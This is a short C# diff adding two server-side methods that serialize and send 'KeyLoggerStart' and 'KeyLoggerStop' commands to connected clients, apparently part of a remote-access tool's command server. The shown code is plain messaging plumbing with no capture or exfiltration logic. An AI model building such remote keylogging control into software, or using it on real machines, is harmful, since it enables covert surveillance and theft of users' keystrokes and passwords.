@@ -28,6 +28,19 @@ namespace Server.Services
 
         //-------------------------------------//
 
+        public async Task SendKeyLoggerStartAsync(ServerClientConnection connection, KeyLoggerStart request)
+        {
+            request.ClientId = connection.Id;
+            var json = JsonHelper.Serialize(request);
+            await connection.SendAsync(json);
+        }
+
+        public async Task SendKeyLoggerStopAsync(ServerClientConnection connection, KeyLoggerStop request)
+        {
+            request.ClientId = connection.Id;
+            var json = JsonHelper.Serialize(request);
+            await connection.SendAsync(json);
+        }
     }
 }
 
